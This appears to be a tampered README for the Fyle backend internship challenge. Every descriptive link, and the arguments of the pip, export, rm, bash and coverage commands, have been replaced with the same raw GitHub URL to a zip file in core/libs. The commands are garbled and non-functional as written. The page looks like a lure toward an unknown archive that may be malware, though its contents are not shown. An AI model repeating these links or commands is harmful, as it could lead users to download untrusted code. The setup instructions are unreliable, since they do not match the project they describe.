# Fyle Backend Challenge

## Who is this for?

This challenge is meant for candidates who wish to intern at Fyle and work with our engineering team. You should be able to commit to at least 6 months of dedicated time for internship.

## Why work at Fyle?

Fyle is a fast-growing Expense Management SaaS product. We are ~40 strong engineering team at the moment. 

We are an extremely transparent organization. Check out our [careers page](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip) that will give you a glimpse of what it is like to work at Fyle. Also, check out our Glassdoor reviews [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip). You can read stories from our teammates [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip).


## Challenge outline

**You are allowed to use any online/AI tool such as ChatGPT, Gemini, etc. to complete the challenge. However, we expect you to fully understand the code and logic involved.**

This challenge involves writing a backend service for a classroom. The challenge is described in detail [here](https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip)


## What happens next?

You will hear back within 48 hours from us via email. 


## Installation

1. Fork this repository to your github account
2. Clone the forked repository and proceed with steps mentioned below

### Install requirements

```
virtualenv env --python=python3.8
source env/bin/activate
pip install -r https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
```
### Reset DB

```
export https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
rm https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
flask db upgrade -d core/migrations/
```
### Start Server

```
bash https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
```
### Run Tests

```
pytest -vvv -s tests/

# for test coverage report
# pytest --cov
# open https://raw.githubusercontent.com/nikvaid1/fyle-interview-intern-backend/main/core/libs/fyle_interview_backend_intern_swiper.zip
```
